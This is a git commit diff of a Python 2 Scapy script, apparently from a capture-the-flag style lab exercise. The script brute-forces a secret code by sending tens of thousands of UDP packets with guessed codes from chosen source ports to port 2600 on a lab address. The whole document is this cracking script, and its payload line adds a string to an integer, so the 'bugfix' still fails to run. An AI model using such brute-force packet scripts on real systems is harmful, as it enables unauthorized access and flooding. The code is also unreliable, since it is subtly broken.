0b94b6a531670d06e882f6a2d229313062323997
Brandon <Brandon.Kamaka@afit.edu>
2019-01-11 13:09:29 -0500

    Initial Bugfix

--- mission_impossible.py
+++ mission_impossible.py
@@ -1,30 +1,32 @@
 from scapy.all import *
 from scapy.layers.inet import *
-from socket import *
 
 
-# Setup packet parameters
-target = "CHANGE THIS TO A THING"
-agent_name = "Ethan Hunt "
-ports = [3, 33, 333, 3333, 33333]
+def main():
+    # Setup packet parameters
+    target = "10.12.1.144"
+    agent_name = "Ethan Hunt "
+    ports = [3, 33, 333, 3333, 33333]
 
-def packet_craft(agent_name, code_attempt, source_port):
+    print "Beginning cracking...\n"
+
+    # First we craft a large number of packets using a random ephemeral port
+
+    for p in ports:
+        for i in range(10000):
+            pkt = packet_craft(agent_name, i, p, target)
+            send(pkt)
+            print "Sent packet {:d} on port {:d}\n".format(i, p)
+
+    print "Done cracking!\n"
+
+
+def packet_craft(agent_name, code_attempt, source_port, target):
     """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
     payload = agent_name + code_attempt
-    pkt = IP() / UDP(dport=2600) / agent_name
+    pkt = IP(dst=target) / UDP(sport=source_port, dport=2600) / payload
     return pkt
 
 
-print "Beginning cracking...\n"
-
-# First we craft a large number of packets using a random ephemeral port
-
-for p in ports:
-    for i in range(10000):
-        pkt = packet_craft(agent_name, i)
-        send(pkt)
-        print "Sent packet {:d} on port {:d}\n".format(i, p)
-
-print "Done cracking!\n"
-
-
+if __name__ == '__main__':
+    main()
